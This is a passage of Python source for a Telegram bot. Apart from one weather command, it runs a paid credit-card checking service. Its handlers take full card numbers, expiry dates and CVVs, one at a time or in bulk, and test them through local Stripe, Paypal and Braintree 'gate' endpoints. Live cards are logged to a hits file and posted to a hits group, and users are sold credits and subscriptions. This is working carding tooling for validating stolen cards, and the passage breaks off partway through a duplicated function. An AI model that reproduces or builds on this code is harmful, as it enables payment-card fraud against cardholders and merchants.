    if message.chat.type != 'private':
        return
    try:
        city = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "❗ Please enter a city name.\nExample: `.wh London`", parse_mode="Markdown")
        return

    send_weather(message, city)

# Common weather function
def send_weather(message, city):
    url = f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}&units=metric"
    r = requests.get(url)
    if r.status_code == 200:
        data = r.json()
        main = data['main']
        weather = data['weather'][0]
        wind = data['wind']
        city_name = data['name']
        country = data['sys']['country']

        reply = (
            "┏━━━━━━━⍟\n"
            "┃ Weather Info\n"
            "┗━━━━━━━━━━━⊛\n\n"
            f"✧ City        : <code>{city_name}, {country}</code>\n"
            f"✧ Temperature : <code>{main['temp']}°C</code>\n"
            f"✧ Weather     : <code>{weather['description'].capitalize()}</code>\n"
            f"✧ Humidity    : <code>{main['humidity']}%</code>\n"
            f"✧ Wind Speed  : <code>{wind['speed']} m/s</code>"
        )
        bot.reply_to(message, reply, parse_mode="HTML")
    else:
        bot.reply_to(message, "❗ City not found or API error.", parse_mode="Markdown")

    log_bot_activity(message)

def check_premium_auth_cc(cc):
    try:
        # Normalize input (same as before)
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Premium Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback (same as before)
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup (same as before)
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request to Premium Auth endpoint
        try:
            response = requests.get(
                f"http://127.0.0.1:5111/gate=1/key=darkwaslost/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                    
                    # Special handling for Premium Auth response
                    if 'result' in data:
                        try:
                            result_data = json.loads(data['result'])
                            if isinstance(result_data, list) and len(result_data) > 0:
                                if result_data[0].get('data', {}).get('ecommerceStoreStripePaymentMethod', {}).get('ok', False):
                                    status = 'APPROVED'
                        except:
                            pass
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe + Paypal [0.5$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe + Paypal [0.5$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe + Paypal [0.5$]'
        }
    
# Handle both /ax and .ax (Free Users Version)
@bot.message_handler(commands=['ax'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ax'))
def handle_ax_free(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ax CC|MM|YYYY|CVV or .ax CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".ax "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe + Paypal [0.5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_premium_auth_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /max and .max (mass check)
@bot.message_handler(commands=['max'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.max'))
def handle_max(message):
    # Check if user is subscribed (Premium Auth is only for subscribed users)
    if not is_user_subscribed(message.from_user.id) and str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Premium Auth is only available for subscribed users.")
        return
        
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return

    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_premium_auth_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe + Paypal [1$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_sx_cc(cc):
    try:
        # Normalize input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate minimum length
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Safe YY conversion
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN info fallback
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted card
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # API request
        try:
            response = requests.get(
                f"http://127.0.0.1:5050/gate=s1/key=darkwaslost/cc={formatted_cc}",
                timeout=300
            )
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except Exception:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status normalization
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif status not in ['APPROVED', 'DECLINED']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [1$]'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe [1$]'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [1$]'
        }

@bot.message_handler(commands=['sx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sx'))
def handle_sx(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @SongPY To get approved")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sx CC|MM|YYYY|CVV or .sx CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[3:].strip()  # remove ".sx "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Fixed format string - properly escape curly braces
        status_msg = bot.reply_to(message, 
            "↯ Checking..\n\n"
            "⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n"
            "⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>Stripe [1$]</i>\n"
            "⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), 
            parse_mode='HTML')

        def check_card():
            try:
                result = check_sx_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mchk and .mchk
# Handle both /msx and .msx (Subscribers Only)
@bot.message_handler(commands=['msx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msx'))
def handle_msx_sub_only(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed (added this restriction)
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Use the higher limit for subscribed users
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_sx_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe Auth'  # Changed to Stripe Auth
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}",
                                    parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_b4_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B4_API_URL.format(formatted_cc), headers=headers, timeout=200)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                    
                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
                message = data.get('response', 'Declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth 2'
        }


# Handle both /b3 and .b3
@bot.message_handler(commands=['b4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b4'))
def handle_b4(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b4 CC|MM|YYYY|CVV or .b4 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth 2</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b4_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def check_b4_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
